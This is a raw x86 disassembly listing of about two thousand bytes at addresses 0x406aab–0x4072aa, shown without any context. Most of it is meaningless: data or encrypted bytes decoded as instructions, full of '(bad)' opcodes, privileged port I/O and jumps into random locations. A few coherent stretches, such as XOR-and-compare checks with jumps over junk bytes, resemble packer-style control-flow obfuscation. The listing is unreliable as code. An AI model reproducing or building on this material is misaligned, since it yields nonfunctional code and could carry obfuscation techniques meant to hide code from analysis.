  406aab:	aad    0xdc
  406aad:	test   al,0x82
  406aaf:	cli    
  406ab0:	mov    DWORD PTR [ecx],edx
  406ab2:	and    al,0x41
  406ab4:	popf   
  406ab5:	or     ebx,DWORD PTR [bp+si-0x45]
  406ab9:	mov    ebp,0x74447a0e
  406abe:	push   esi
  406abf:	and    edi,esp
  406ac1:	push   eax
  406ac2:	adc    BYTE PTR [edx],cl
  406ac4:	iret   
  406ac5:	push   edi
  406ac6:	cmp    eax,0xab4a9750
  406acb:	or     eax,0xf112a0b1
  406ad0:	sbb    BYTE PTR [eax+0x404efaa8],dh
  406ad6:	jnp    0x406aea
  406ad8:	mov    ah,0xb9
  406ada:	out    dx,al
  406adb:	push   ecx
  406adc:	in     eax,0x86
  406ade:	ret    0xa854
  406ae1:	sbb    ebp,ebp
  406ae3:	aas    
  406ae4:	pop    ds
  406ae5:	fisubr WORD PTR [edi]
  406ae7:	or     BYTE PTR [ebx-0x57a68ae],al
  406aed:	mov    ecx,0xde94ffec
  406af2:	cmp    eax,0x65cf0472
  406af7:	jl     0x406aeb
  406af9:	push   cs
  406afa:	cmc    
  406afb:	mov    edx,0xf4c03bc9
  406b00:	cwde   
  406b01:	mov    esp,DWORD PTR [ecx+0x7927bb5a]
  406b07:	cmp    ebp,ecx
  406b09:	push   ebx
  406b0a:	mov    edx,DWORD PTR [ebp-0x4]
  406b0d:	xor    eax,esi
  406b0f:	mov    DWORD PTR [ebp+0x10],eax
  406b12:	add    eax,0x99b8624c
  406b17:	jmp    0x406bef
  406b1c:	dec    esp
  406b1d:	xor    eax,0xbffbb3ba
  406b22:	dec    ebp
  406b23:	dec    esp
  406b25:	stos   BYTE PTR es:[edi],al
  406b26:	jmp    0x406b44
  406b28:	inc    ebx
  406b29:	cmp    DWORD PTR [edx],ecx
  406b2b:	addr16 aas 
  406b2d:	cmp    BYTE PTR [eax],al
  406b2f:	add    BYTE PTR [ebx+0x29000000],bh
  406b35:	cmp    DWORD PTR [ecx],0x22
  406b38:	fadd   st(6),st
  406b3a:	fstp   TBYTE PTR [edi-0x704a700e]
  406b40:	and    eax,0x577e202e
  406b45:	mov    bl,0x1
  406b47:	sub    al,0xb2
  406b49:	(bad)  
  406b4a:	cli    
  406b4b:	sub    eax,0xdfdc264d
  406b50:	mov    DWORD PTR [ebx-0x41],edi
  406b53:	adc    eax,0xf60317b0
  406b58:	call   0xf02f:0x2252ae0e
  406b5f:	push   ecx
  406b60:	jmp    0x406b8c
  406b62:	leave  
  406b63:	lods   eax,DWORD PTR ds:[esi]
  406b64:	pop    ebx
  406b65:	mov    al,0xf1
  406b67:	push   es
  406b68:	fwait
  406b69:	jecxz  0x406afe
  406b6b:	inc    esp
  406b6c:	arpl   bp,cx
  406b6e:	fcom   DWORD PTR [eax-0xccd3db7]
  406b74:	adc    ebp,edi
  406b76:	push   ebp
  406b77:	push   0x2b
  406b79:	fdiv   st(0),st
  406b7b:	js     0x406b8d
  406b7d:	push   edx
  406b7e:	jmp    0x406b4d
  406b80:	shr    ecx,cl
  406b82:	scas   al,BYTE PTR es:[edi]
  406b83:	enter  0xb610,0x3e
  406b87:	fxch   st(1)
  406b89:	mov    bl,0x25
  406b8b:	adc    bl,bh
  406b8d:	int    0xc2
  406b8f:	jmp    0x235b102
  406b94:	push   eax
  406b95:	xor    al,0x24
  406b97:	imul   esp,DWORD PTR [ecx],0x5c84551
  406b9d:	add    ah,dh
  406b9f:	daa    
  406ba0:	inc    eax
  406ba1:	inc    esp
  406ba2:	dec    edx
  406ba3:	or     cl,BYTE PTR [edx+0x3f40281f]
  406ba9:	fidivr WORD PTR [ecx-0x7a564363]
  406baf:	or     al,BYTE PTR [ebp-0x5200f746]
  406bb5:	pushf  
  406bb6:	aaa    
  406bb7:	mov    bl,0xf2
  406bb9:	inc    ebx
  406bba:	cs loope 0x406bdb
  406bbd:	call   0x619e:0x1d5de7e3
  406bc4:	xor    eax,DWORD PTR [eax-0x3d130ec0]
  406bca:	jmp    0xc153:0x4cacd47f
  406bd1:	xchg   ebp,eax
  406bd2:	icebp  
  406bd3:	push   es
  406bd4:	sub    BYTE PTR [ebx],dh
  406bd6:	or     edi,DWORD PTR [edi-0xd3fa6a0]
  406bdc:	in     al,0x8a
  406bde:	and    al,0xbc
  406be0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406be1:	lock fucom st(5)
  406be4:	sub    DWORD PTR [eax-0x39],0xffffffca
  406be8:	inc    ebx
  406be9:	call   0xf769:0xdd439011
  406bf0:	shl    BYTE PTR [ebx],1
  406bf2:	ret    0xd3e9
  406bf5:	add    BYTE PTR [eax],al
  406bf7:	add    dh,bh
  406bf9:	push   ebp
  406bfa:	mov    ch,0x24
  406bfc:	mov    edi,0x9bdfffe4
  406c01:	leave  
  406c02:	sub    edi,DWORD PTR [ebx-0x40a50baf]
  406c08:	cli    
  406c09:	cmp    BYTE PTR [eax],al
  406c0b:	add    BYTE PTR [ebx+0x15000000],bh
  406c11:	or     al,0x76
  406c13:	aad    0xa8
  406c15:	fst    DWORD PTR [edi+0x3f]
  406c18:	pushf  
  406c19:	sub    BYTE PTR [eax],al
  406c1b:	mov    DWORD PTR ds:0x13272e6,ecx
  406c21:	imul   edx,eax,0x1b59f2a
  406c27:	and    esp,DWORD PTR [ebx]
  406c29:	push   es
  406c2a:	mov    ds,WORD PTR [ecx]
  406c2c:	sub    eax,0x1a6f9127
  406c31:	stos   BYTE PTR es:[edi],al
  406c32:	and    eax,0xfb87962f
  406c37:	mov    ch,dl
  406c39:	add    esi,DWORD PTR [edi+0x5507b56e]
  406c3f:	and    eax,0xd878f098
  406c44:	add    DWORD PTR [edx+0x72],ebp
  406c47:	mov    ebx,0x9811656a
  406c4c:	fstp   TBYTE PTR [edx+0x63]
  406c4f:	popf   
  406c50:	ins    DWORD PTR es:[edi],dx
  406c51:	stos   DWORD PTR es:[edi],eax
  406c52:	inc    esi
  406c53:	call   FWORD PTR [edx+0x23]
  406c56:	sub    eax,0xca71c317
  406c5b:	pop    eax
  406c5c:	fldenv [esi]
  406c5e:	shl    DWORD PTR [edx+ebp*8],0xc3
  406c62:	leave  
  406c63:	jne    0x406c2a
  406c65:	dec    ebx
  406c66:	xchg   esi,eax
  406c67:	nop
  406c68:	cmp    ch,BYTE PTR [edi-0x6b]
  406c6b:	jecxz  0x406c0f
  406c6d:	pushf  
  406c6e:	imul   esp,DWORD PTR [ebx-0x2d54e474],0xffffffb8
  406c75:	pop    esi
  406c76:	cmp    al,BYTE PTR [esi]
  406c78:	bound  ebx,QWORD PTR [ebx+0x50c3caab]
  406c7e:	mov    ch,0xbc
  406c80:	inc    ebp
  406c81:	cmp    bh,al
  406c83:	push   eax
  406c84:	or     edi,DWORD PTR [ebp-0x29]
  406c87:	sub    ebp,esi
  406c89:	mov    ebp,DWORD PTR [esi+0x611a28ef]
  406c8f:	or     ah,dl
  406c91:	fs fwait
  406c93:	xchg   esp,eax
  406c94:	adc    DWORD PTR [edi],0x9ab4e350
  406c9a:	jl     0x406cad
  406c9c:	push   ebx
  406c9d:	(bad)  
  406c9f:	sahf   
  406ca0:	adc    al,0x7a
  406ca2:	cmp    ecx,ecx
  406ca4:	mov    cl,0x32
  406ca6:	mov    edi,0x47e2ddf9
  406cab:	mov    ds:0xb62d7dab,eax
  406cb0:	lods   eax,DWORD PTR ds:[esi]
  406cb1:	xchg   edi,eax
  406cb2:	sub    BYTE PTR [ebx+0x35],ch
  406cb5:	fnstsw WORD PTR [ebx]
  406cb7:	push   ds
  406cb8:	or     eax,0x3970bfe2
  406cbd:	push   esi
  406cbe:	mov    bh,0x18
  406cc0:	out    0x10,al
  406cc2:	jno    0x406cd6
  406cc4:	hlt    
  406cc5:	or     ebp,DWORD PTR [edi]
  406cc7:	xchg   ch,dh
  406cc9:	jle    0x406c98
  406ccb:	mov    DWORD PTR [ebp-0x4],eax
  406cce:	mov    eax,DWORD PTR [ebp-0x40]
  406cd1:	jmp    0x406da9
  406cd6:	pop    ecx
  406cd7:	xor    eax,0xdfee0be2
  406cdc:	stc    
  406cdd:	ja     0x406d46
  406cdf:	(bad)  
  406ce1:	aas    
  406ce2:	fsubrp st(1),st
  406ce4:	fs mov ebx,0x39b5
  406cea:	mov    ebx,0x8e000000
  406cef:	xchg   BYTE PTR [esi],cl
  406cf1:	adc    dh,dh
  406cf3:	(bad)  
  406cf5:	out    0x32,al
  406cf7:	cmp    ebp,DWORD PTR [ebp-0x79]
  406cfa:	sbb    BYTE PTR [edi+0xc9bce31],ch
  406d00:	cmp    eax,0xaf0f10d6
  406d05:	adc    ch,dh
  406d07:	xor    DWORD PTR [esi],ecx
  406d09:	xor    eax,0xb4acaedb
  406d0e:	mov    edi,0xbc4a4bb4
  406d13:	adc    ebx,DWORD PTR [edi+0x2fb80a31]
  406d19:	xor    eax,0x70ed7d3e
  406d1e:	inc    BYTE PTR [ebx]
  406d20:	dec    ebx
  406d21:	fwait
  406d22:	(bad)  
  406d23:	xor    al,0x3c
  406d25:	ins    BYTE PTR es:[edi],dx
  406d26:	sbb    ebp,DWORD PTR [esi]
  406d28:	mov    ds:0xd986637,al
  406d2d:	fisubr WORD PTR [edi+0x71]
  406d30:	js     0x406d9a
  406d32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d33:	xchg   edi,eax
  406d34:	sub    DWORD PTR [ebx],edx
  406d36:	call   0xecc6b5eb
  406d3b:	imul   ecx,DWORD PTR [eax+0x5567315a],0xffffffad
  406d42:	sbb    eax,0x7315d9fe
  406d47:	lds    ebx,FWORD PTR [esi-0x44ae94a3]
  406d4d:	sub    BYTE PTR [ebp-0x53],dh
  406d50:	add    DWORD PTR [esi+0x4c],esp
  406d53:	shl    DWORD PTR [edi],cl
  406d55:	dec    esi
  406d56:	int3   
  406d57:	push   0xa4401a66
  406d5c:	aas    
  406d5d:	loop   0x406dd8
  406d5f:	inc    esp
  406d60:	ds ins BYTE PTR es:[edi],dx
  406d62:	ret    0xccc7
  406d65:	mov    dl,BYTE PTR [edi+esi*8]
  406d68:	cmp    ebp,DWORD PTR [esi-0x58]
  406d6b:	je     0x406dd2
  406d6d:	push   esp
  406d6e:	mov    ebx,0x427c499
  406d73:	movmskps esi,xmm3
  406d76:	popa   
  406d77:	pushf  
  406d78:	adc    BYTE PTR [ebp+0x0],ch
  406d7b:	lods   al,BYTE PTR ds:[esi]
  406d7c:	outs   dx,DWORD PTR ds:[esi]
  406d7d:	test   edi,esi
  406d7f:	(bad)  [edi+0x74]
  406d82:	push   edx
  406d83:	adc    BYTE PTR [ebx-0x4c],cl
  406d86:	std    
  406d87:	lahf   
  406d88:	push   edi
  406d89:	inc    ecx
  406d8a:	mov    cl,0xc5
  406d8c:	mov    al,ds:0x803123b3
  406d91:	dec    esi
  406d92:	das    
  406d93:	lock call 0x7f50:0xd2326ab6
  406d9b:	dec    eax
  406d9c:	(bad)  
  406d9d:	xchg   edx,eax
  406d9e:	dec    ecx
  406d9f:	lods   al,BYTE PTR ds:[esi]
  406da0:	es addr16 push esp
  406da3:	add    al,0x5c
  406da5:	xchg   ebp,eax
  406da6:	sub    DWORD PTR [edx-0x1d],ebp
  406da9:	mov    edx,DWORD PTR [ebp-0x3c]
  406dac:	mov    edx,0xd260
  406db1:	xor    ax,dx
  406db4:	mov    edx,0x624d
  406db9:	add    ax,dx
  406dbc:	mov    edx,DWORD PTR [ebp-0x4]
  406dbf:	cmp    WORD PTR [edx],ax
  406dc2:	je     0x407330
  406dc8:	mov    eax,0x66479db3
  406dcd:	sub    eax,DWORD PTR [ebp+0x10]
  406dd0:	jmp    0x406ea8
  406dd5:	mov    BYTE PTR [ecx-0x40cc6ace],bl
  406ddb:	scas   eax,DWORD PTR es:[edi]
  406ddc:	popf   
  406ddd:	ret    
  406dde:	sar    BYTE PTR [ebx],0xc3
  406de1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406de2:	push   ebp
  406de3:	mov    DWORD PTR [edi],edi
  406de5:	jo     0x406e21
  406de7:	add    BYTE PTR [eax],al
  406de9:	mov    ebx,0x81000000
  406dee:	jmp    0x406da8
  406df0:	int    0x52
  406df2:	les    edx,FWORD PTR [ebp+0x6f]
  406df5:	mov    dl,BYTE PTR [ebp+0x1b]
  406df8:	out    dx,al
  406df9:	rcl    DWORD PTR [ecx-0x76877816],0xa9
  406e00:	or     al,BYTE PTR [eax+0x7ca46e96]
  406e06:	int3   
  406e07:	jmp    0x406db2
  406e09:	(bad)  
  406e0a:	mov    bl,0x89
  406e0c:	idiv   DWORD PTR [ecx-0x35673225]
  406e12:	das    
  406e13:	push   esi
  406e14:	fld    DWORD PTR [ebx]
  406e16:	out    dx,eax
  406e17:	xlat   BYTE PTR ds:[ebx]
  406e18:	pop    edi
  406e19:	test   BYTE PTR [ebp+0x10aaaf1e],cl
  406e1f:	gs aam 0x51
  406e22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e23:	cmp    al,0xb4
  406e25:	push   si
  406e27:	and    DWORD PTR [ecx+0x3fb108a7],esp
  406e2d:	add    DWORD PTR [edi+0x234e5f24],ebp
  406e33:	imul   ecx,DWORD PTR [ebx],0x2e697dcd
  406e39:	sti    
  406e3a:	sbb    DWORD PTR [edx-0x75],0x92668870
  406e41:	nop
  406e42:	push   ds
  406e43:	pop    es
  406e44:	ror    DWORD PTR [ebp+0x3],1
  406e47:	mov    ebp,0x6cd2648e
  406e4c:	fs jle 0x406ec6
  406e4f:	(bad)  
  406e50:	jnp    0x406e73
  406e52:	lods   eax,DWORD PTR ds:[esi]
  406e53:	clc    
  406e54:	nop
  406e55:	popf   
  406e56:	inc    ebp
  406e57:	cli    
  406e58:	cmc    
  406e59:	repz xchg esp,eax
  406e5b:	fisubr WORD PTR [edx-0x4b]
  406e5e:	sub    DWORD PTR [esi],edx
  406e60:	(bad)  
  406e61:	xlat   BYTE PTR ds:[ebx]
  406e62:	add    al,0x31
  406e64:	stc    
  406e65:	imul   edi,DWORD PTR [edx-0x18],0xf
  406e69:	inc    edi
  406e6a:	arpl   WORD PTR [ecx],si
  406e6c:	cmp    ah,BYTE PTR [edi-0x12]
  406e6f:	fs test al,0x26
  406e72:	test   eax,edi
  406e74:	dec    esp
  406e75:	popf   
  406e76:	pop    ebx
  406e77:	out    dx,eax
  406e78:	cld    
  406e79:	out    dx,eax
  406e7a:	cmc    
  406e7b:	std    
  406e7c:	push   edx
  406e7d:	pop    edi
  406e7e:	pop    eax
  406e7f:	mov    dh,0xd0
  406e81:	outs   dx,DWORD PTR ds:[esi]
  406e82:	dec    esp
  406e83:	inc    esp
  406e84:	call   0x5ab6470a
  406e89:	xlat   BYTE PTR ds:[ebx]
  406e8a:	inc    ecx
  406e8b:	sub    DWORD PTR [edi-0x3a1c0b67],ebx
  406e91:	inc    edi
  406e93:	jno    0x406e68
  406e95:	std    
  406e96:	jns    0x406ef6
  406e98:	push   0x6f73a432
  406e9d:	fistp  DWORD PTR [ebp+0x13]
  406ea0:	sbb    BYTE PTR [ecx-0x7156796d],0x6c
  406ea7:	mov    al,ds:0x89fc4503
  406eac:	inc    ebp
  406ead:	cld    
  406eae:	mov    eax,DWORD PTR [edi]
  406eb0:	mov    edx,DWORD PTR [edi+0x4]
  406eb3:	xor    edx,ebx
  406eb5:	xor    eax,esi
  406eb7:	jmp    0x406f8f
  406ebc:	mov    edi,0x6a086295
  406ec1:	(bad)  
  406ec2:	push   DWORD PTR [edi+0x3328aa8f]
  406ec8:	or     BYTE PTR [esi+0x78],ah
  406ecb:	lahf   
  406ecc:	sub    edi,DWORD PTR [ebx]
  406ece:	add    BYTE PTR [eax],al
  406ed0:	mov    ebx,0x37000000
  406ed5:	popa   
  406ed6:	xor    eax,0xb817bdec
  406edb:	cmp    BYTE PTR [edx-0x41],dh
  406ede:	std    
  406edf:	sbb    bl,al
  406ee1:	imul   ecx,DWORD PTR [eax+0x32],0xadba47
  406ee8:	ror    al,0xb
  406eeb:	pop    ebx
  406eec:	and    bh,BYTE PTR [edx]
  406eee:	cmp    DWORD PTR [ecx-0x2d37966c],0x505b5d0e
  406ef8:	pop    esi
  406ef9:	lods   eax,DWORD PTR ds:[esi]
  406efa:	pop    ecx
  406efb:	ret    
  406efc:	dec    ecx
  406efd:	add    DWORD PTR [eax],ecx
  406eff:	out    0x94,al
  406f01:	xor    dl,BYTE PTR [ebx+0x9]
  406f04:	pop    ebp
  406f05:	xchg   ebx,eax
  406f06:	adc    esi,edx
  406f08:	in     eax,dx
  406f09:	sbb    ebx,DWORD PTR [edi+eax*4+0x16]
  406f0d:	or     eax,0xcbb7bb50
  406f12:	jmp    0x406f62
  406f14:	lds    ebx,FWORD PTR [ecx]
  406f16:	(bad)  
  406f17:	xor    eax,0x29347e0c
  406f1c:	xor    al,0x72
  406f1e:	sub    DWORD PTR [ebp-0x7a439f0b],edx
  406f24:	inc    ebx
  406f25:	out    0xbd,eax
  406f27:	in     eax,0x71
  406f29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f2a:	cmp    bl,BYTE PTR [ebx+ecx*8]
  406f2d:	inc    eax
  406f2e:	outs   dx,DWORD PTR ds:[esi]
  406f2f:	jmp    0x406eec
  406f31:	xor    eax,DWORD PTR [edi+esi*4+0x4c]
  406f35:	pop    ebp
  406f36:	(bad)  
  406f37:	jmp    0x99e5ddd2
  406f3c:	ins    BYTE PTR es:[edi],dx
  406f3d:	es push 0xdcd27536
  406f43:	sub    bh,BYTE PTR ss:[esi]
  406f46:	loopne 0x406eeb
  406f48:	inc    ecx
  406f49:	lds    esi,FWORD PTR [ebx+0x31cba2c2]
  406f4f:	mov    bl,0xf5
  406f51:	cmp    al,0x4d
  406f53:	mov    ch,0xa9
  406f55:	ds in  eax,0xe7
  406f58:	or     al,0x38
  406f5a:	loopne 0x406fc9
  406f5c:	xor    ecx,DWORD PTR [ebx+0x78d3d3b8]
  406f62:	mov    WORD PTR [edx+eax*2+0x7f400014],gs
  406f69:	cs (bad) 
  406f6b:	mov    bl,0xf
  406f6d:	sbb    DWORD PTR [edi+0xd08defc],0xffffffeb
  406f74:	jne    0x406f9a
  406f76:	mov    dh,BYTE PTR fs:[eax-0x32]
  406f7a:	and    al,0x75
  406f7c:	and    BYTE PTR [eax+0x10],0x32
  406f80:	mov    bh,0xc2
  406f82:	ja     0x406f13
  406f84:	call   0xca6a:0x4dfd8ac6
  406f8b:	push   edx
  406f8c:	mov    WORD PTR [ebp+0x624d055b],fs
  406f92:	mov    eax,0xd3e999
  406f97:	add    BYTE PTR [eax],al
  406f99:	popa   
  406f9a:	push   ds
  406f9b:	xchg   ebx,eax
  406f9c:	stos   BYTE PTR es:[edi],al
  406f9d:	jmp    FWORD PTR [edi-0x39be2087]
  406fa3:	shl    BYTE PTR [ebx],1
  406fa5:	mov    bl,0x56
  406fa7:	mov    ds:0x3be67a,eax
  406fac:	add    BYTE PTR [ebx+0x53000000],bh
  406fb2:	sti    
  406fb3:	arpl   WORD PTR [esi],si
  406fb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fb6:	inc    esi
  406fb7:	inc    esp
  406fb8:	in     eax,0xeb
  406fba:	mov    ah,0x81
  406fbc:	sbb    BYTE PTR [edi+0x747ea347],al
  406fc2:	int3   
  406fc3:	inc    edx
  406fc4:	xor    eax,0x9f0e7427
  406fc9:	fcomp  DWORD PTR [eax-0x5a6f5f38]
  406fcf:	jmp    0x6815:0xf83fd51c
  406fd6:	jb     0x406ff9
  406fd8:	mov    esp,cs
  406fda:	loop   0x406f77
  406fdc:	inc    esi
  406fdd:	dec    edx
  406fde:	pop    ebx
  406fdf:	push   eax
  406fe0:	pop    ecx
  406fe1:	(bad)  
  406fe2:	hlt    
  406fe3:	cmp    al,0x1a
  406fe5:	jb     0x406f7f
  406fe7:	pand   mm3,QWORD PTR [esi]
  406fea:	jno    0x406faf
  406fec:	in     al,0x11
  406fee:	xor    bh,dl
  406ff0:	mov    al,ds:0x1846e6a0
  406ff5:	mov    ch,0xe8
  406ff7:	stos   DWORD PTR es:[edi],eax
  406ff8:	fidiv  WORD PTR [ecx]
  406ffa:	in     al,dx
  406ffb:	pop    eax
  406ffc:	iret   
  406ffd:	icebp  
  406ffe:	or     edi,DWORD PTR [ecx+0x48661ac1]
  407004:	(bad)  
  407005:	data16 add al,0x4f
  407008:	jl     0x406fd7
  40700a:	jecxz  0x406fb8
  40700c:	fld    QWORD PTR [ebx+0x6d]
  40700f:	pusha  
  407010:	mov    esi,DWORD PTR [edi-0x6def8707]
  407016:	adc    ebp,DWORD PTR [esp+ebp*4]
  407019:	dec    eax
  40701a:	adc    edi,DWORD PTR [eax+0x31]
  40701d:	or     al,0x9a
  40701f:	stos   BYTE PTR es:[edi],al
  407020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407021:	(bad)  [eax]
  407023:	jmp    0x40707b
  407025:	xor    BYTE PTR [ebp+0x40],al
  407028:	(bad)  cs:[ecx-0x7ef40d38]
  40702f:	or     al,0x44
  407031:	mov    ds:0xe3c96f60,eax
  407036:	cmc    
  407037:	and    esi,edi
  407039:	ficom  WORD PTR [ecx]
  40703b:	stc    
  40703c:	shr    cl,0xc1
  40703f:	sti    
  407040:	pop    edx
  407041:	mov    ebp,0xdd0a98ef
  407046:	aad    0x30
  407048:	push   es
  407049:	test   BYTE PTR [ebx+0x1b],al
  40704c:	cmp    dh,BYTE PTR [edi-0x3ca2f1d2]
  407052:	mov    ebx,0x8652361b
  407057:	jb     0x407011
  407059:	sahf   
  40705a:	scas   al,BYTE PTR es:[edi]
  40705b:	repz stc 
  40705d:	adc    BYTE PTR [esi],al
  40705f:	frstor [edx+edx*4+0x33]
  407063:	enter  0x5f8f,0xdd
  407067:	jno    0x40704c
  407069:	gs cs dec ebp
  40706c:	adc    edx,0x8ddc
  407072:	mov    DWORD PTR [ebp+0x18],eax
  407075:	mov    eax,DWORD PTR [ecx]
  407077:	jmp    0x40714f
  40707c:	mov    ds:0x6e816ec5,eax
  407081:	stos   DWORD PTR es:[edi],eax
  407082:	out    dx,eax
  407083:	out    0x7a,eax
  407085:	jmp    0x95dd:0xd9373fa9
  40708c:	mov    eax,ds:0xbb00003c
  407091:	add    BYTE PTR [eax],al
  407093:	add    BYTE PTR [ebx+0x75],bh
  407096:	cmp    al,bl
  407098:	ret    
  407099:	mov    bh,0xc
  40709b:	jecxz  0x407051
  40709d:	add    dl,BYTE PTR [eax]
  40709f:	push   ds
  4070a0:	xor    DWORD PTR [ebx-0x18373bcc],edx
  4070a6:	xchg   edi,eax
  4070a7:	mov    ebx,DWORD PTR [esi-0x52]
  4070aa:	loope  0x407039
  4070ac:	mov    bh,0xda
  4070ae:	push   es
  4070af:	pop    ss
  4070b0:	and    al,0x9e
  4070b2:	hlt    
  4070b3:	clc    
  4070b4:	mov    dl,0xa9
  4070b6:	cmp    al,0x3f
  4070b8:	push   edi
  4070b9:	mov    ds:0xadd54841,al
  4070be:	aad    0x2f
  4070c0:	out    0xcb,eax
  4070c2:	(bad)
  4070c6:	in     eax,dx
  4070c7:	add    DWORD PTR [edi-0x17],eax
  4070ca:	aaa    
  4070cb:	push   ecx
  4070cc:	leave  
  4070cd:	aas    
  4070ce:	cwde   
  4070cf:	mov    ebx,0x75d256f5
  4070d4:	mov    edi,0x13eae362
  4070d9:	lods   al,BYTE PTR ds:[esi]
  4070da:	or     dl,BYTE PTR [edx+0x79]
  4070dd:	aad    0xea
  4070df:	loop   0x4070d8
  4070e1:	xlat   BYTE PTR ds:[ebx]
  4070e2:	cmp    DWORD PTR [ebx],ebp
  4070e4:	jl     0x407101
  4070e6:	inc    eax
  4070e7:	jmp    FWORD PTR [ecx-0x1e1a09e5]
  4070ed:	dec    edx
  4070ee:	test   esp,ecx
  4070f0:	(bad)  
  4070f1:	iret   
  4070f2:	fdiv   st(6),st
  4070f4:	sbb    DWORD PTR ds:[ebx+0x7e423441],edi
  4070fb:	jmp    0xcbbb38ad
  407100:	hlt    
  407101:	fcom   DWORD PTR [edx+0x49]
  407104:	jns    0x4070a5
  407106:	lahf   
  407107:	cmc    
  407108:	adc    DWORD PTR [edx+edi*2-0x4f1c88f0],ebp
  40710f:	pop    ss
  407110:	mov    dh,0x90
  407112:	fldenv [edi+ebx*1+0x4b]
  407116:	add    eax,0xf1ebce8d
  40711b:	gs and eax,0x1332f100
  407121:	test   DWORD PTR [ecx-0x2d1dad4f],0x304c1128
  40712b:	repz lahf 
  40712d:	push   ecx
  40712e:	in     al,0x20
  407130:	mov    edx,0x64fc6f30
  407135:	sbb    eax,0x3f8b91ab
  40713a:	imul   BYTE PTR [eax-0x30f39e92]
  407140:	(bad)  
  407141:	mov    edi,0x2f2dc6f3
  407146:	dec    esp
  407147:	fwait
  407148:	push   esp
  407149:	cdq    
  40714a:	xchg   edx,eax
  40714b:	mov    ebx,0x89dbfb8e
  407150:	push   ebp
  407151:	sbb    al,0x8b
  407153:	push   ecx
  407154:	add    al,0x33
  407156:	(bad)  
  407157:	xor    edx,ebx
  407159:	add    eax,0x99b8624d
  40715e:	adc    edx,0x8ddc
  407164:	mov    DWORD PTR [ebp-0x5c],edx
  407167:	cmp    DWORD PTR [ebp+0x18],eax
  40716a:	jne    0x406cce
  407170:	jmp    0x407248
  407175:	ret    0x94f
  407178:	sti    
  407179:	(bad)  
  40717a:	push   edx
  40717c:	jg     0x40716c
  40717e:	xor    eax,esp
  407180:	or     eax,0xbf8cc3fa
  407185:	pop    esp
  407186:	cmp    eax,0xbb0000
  40718b:	add    BYTE PTR [eax],al
  40718d:	stos   BYTE PTR es:[edi],al
  40718e:	(bad)  
  40718f:	xor    edx,ecx
  407191:	mov    eax,ds:0xd86dc7cb
  407196:	int    0x5
  407198:	mov    ebx,0x91592801
  40719d:	mov    edx,0xa8471882
  4071a2:	xchg   edx,eax
  4071a3:	aas    
  4071a4:	and    BYTE PTR [ebx],0xe3
  4071a7:	add    dl,0x91
  4071aa:	jg     0x40720f
  4071ac:	(bad)  
  4071ae:	inc    ebp
  4071af:	mov    ss,WORD PTR [eax+0x6801e2c3]
  4071b5:	fwait
  4071b6:	inc    esp
  4071b7:	pop    edx
  4071b8:	hlt    
  4071b9:	mov    ds,ecx
  4071bb:	mov    bh,0xf0
  4071bd:	mov    al,ds:0xdd204f93
  4071c2:	add    eax,0x968a2d08
  4071c7:	mov    bh,0x3b
  4071c9:	lock sub edx,DWORD PTR [ecx+edx*1]
  4071cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071ce:	add    eax,0x84fde695
  4071d3:	jae    0x4071bf
  4071d5:	mov    bh,0xb4
  4071d7:	lods   eax,DWORD PTR ds:[esi]
  4071d8:	shl    DWORD PTR [edx+ebx*4],cl
  4071db:	xor    al,0x6
  4071dd:	add    BYTE PTR [esi-0x70c4826],bl
  4071e3:	les    esp,FWORD PTR ds:0x3a11ed14
  4071e9:	out    dx,al
  4071ea:	arpl   WORD PTR [esi],di
  4071ec:	bound  eax,QWORD PTR [edx+0x5]
  4071ef:	aam    0xaf
  4071f1:	jecxz  0x407245
  4071f3:	pop    es
  4071f4:	sbb    bl,BYTE PTR [edi+eiz*1-0x15]
  4071f8:	jle    0x407264
  4071fa:	add    eax,0x4623af1c
  4071ff:	out    0x23,eax
  407201:	(bad)  
  407202:	jnp    0x40721a
  407204:	sbb    BYTE PTR [ebx-0x6a40a902],0x37
  40720b:	dec    esp
  40720c:	sbb    eax,0xd813427a
  407211:	xchg   DWORD PTR [ebx-0x75],eax
  407214:	adc    DWORD PTR [edi],esp
  407216:	rol    DWORD PTR [eax+0x9],cl
  407219:	(bad)  
  40721a:	jbe    0x40719c
  40721c:	or     al,0xb7
  40721e:	push   ebp
  40721f:	je     0x4071a2
  407221:	pop    ebp
  407222:	add    cl,cl
  407224:	adc    cl,ch
  407226:	aaa    
  407227:	dec    esp
  407228:	jne    0x4071fa
  40722a:	xor    BYTE PTR [edi+0x7bd528e2],al
  407230:	mov    BYTE PTR [eax-0x7b7a8552],bl
  407236:	(bad)  
  407237:	pop    esi
  407238:	ins    BYTE PTR es:[edi],dx
  407239:	lods   al,BYTE PTR ds:[esi]
  40723a:	or     dl,al
  40723c:	or     eax,0xd2e93e04
  407241:	lods   eax,DWORD PTR ds:[esi]
  407242:	stos   DWORD PTR es:[edi],eax
  407243:	inc    BYTE PTR [esp+ebp*2]
  407246:	pop    esp
  407247:	push   esi
  407248:	mov    eax,edx
  40724a:	cmp    DWORD PTR [ebp+0x1c],eax
  40724d:	je     0x40ab43
  407253:	jmp    0x406cce
  407258:	jmp    0x407330
  40725d:	jo     0x407234
  40725f:	cld    
  407260:	add    al,0xfd
  407262:	sub    eax,0x4e16f5f8
  407267:	or     eax,0xda8a533
  40726c:	xor    edx,DWORD PTR [edi]
  40726e:	add    BYTE PTR ds:[eax],al
  407271:	mov    ebx,0x53000000
  407276:	mov    ds:0xef47ee68,eax
  40727b:	xchg   ebp,eax
  40727c:	dec    ebp
  40727d:	xchg   edx,eax
  40727e:	loopne 0x407211
  407280:	push   ds
  407281:	inc    esi
  407282:	stos   DWORD PTR es:[edi],eax
  407283:	jge    0x4072a7
  407285:	xchg   DWORD PTR [eax-0x5b],ecx
  407288:	neg    BYTE PTR [ebx-0x1b]
  40728b:	not    BYTE PTR [esi+0x31]
  40728e:	mov    dh,0x5b
  407290:	or     eax,0xe80d56c4
  407295:	dec    edx
  407296:	imul   esi,DWORD PTR [ebx+ecx*4-0x77d607f3],0x9c93411b
  4072a1:	in     eax,dx
  4072a2:	ss cli 
  4072a4:	mov    ebp,0xf873c3a
  4072a9:	xchg   esp,eax
  4072aa:	add    BYTE PTR [edx],ch
